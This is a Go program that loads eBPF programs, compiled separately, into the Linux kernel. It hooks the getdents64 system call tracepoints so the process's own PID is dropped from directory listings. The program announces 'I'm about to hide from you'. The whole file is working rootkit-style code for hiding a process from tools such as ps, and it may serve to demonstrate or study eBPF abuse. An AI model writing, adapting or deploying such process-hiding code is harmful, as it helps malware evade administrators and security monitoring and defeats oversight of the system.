package main

import (
	"context"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"
	log "github.com/sirupsen/logrus"
)

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target bpfel -cc clang -cflags "-O2 -g -Wall -Werror" bpf ../../../ebpf/pid/pid.c -- -I../headers

func main() {
	exit := 1
	patch := 2

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	// Allow the current process to lock memory for eBPF resources.
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal(err)
	}

	pid := os.Getpid()
	log.Infof("I'm about to hide from you %d", pid)
	// Load pre-compiled programs into the kernel.
	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	var arr [10]byte
	pidString := strconv.Itoa(pid)
	copy(arr[:len(pidString)], pidString)

	if err := objs.PidMap.Put(uint32(0), bpfPidWatch{
		PidString:    arr,
		PidStringLen: uint64(len(pidString)),
	}); err != nil {
		log.Fatalf("putting map: %s", err)
	}
	// Configure the array with the pointers to our tail calls
	if err := objs.MapProgArray.Update(uint32(exit), objs.bpfPrograms.HandleGetdentsExit, ebpf.UpdateAny); err != nil {
		log.Fatalf("fighting with tail call maps: %s", err)
	}
	if err := objs.MapProgArray.Update(uint32(patch), objs.bpfPrograms.HandleGetdentsPatch, ebpf.UpdateAny); err != nil {
		log.Fatalf("fighting with tail call maps: %s", err)
	}

	// Load our tracepoint eBPF programs
	kpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64", objs.HandleGetdentsEnter, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer kpEnter.Close()

	// Load our tracepoint eBPF programs
	kpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.HandleGetdentsExit, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer kpExit.Close()

	// Load our tracepoint eBPF programs
	kpPatch, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.HandleGetdentsPatch, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer kpPatch.Close()

	<-ctx.Done()

}
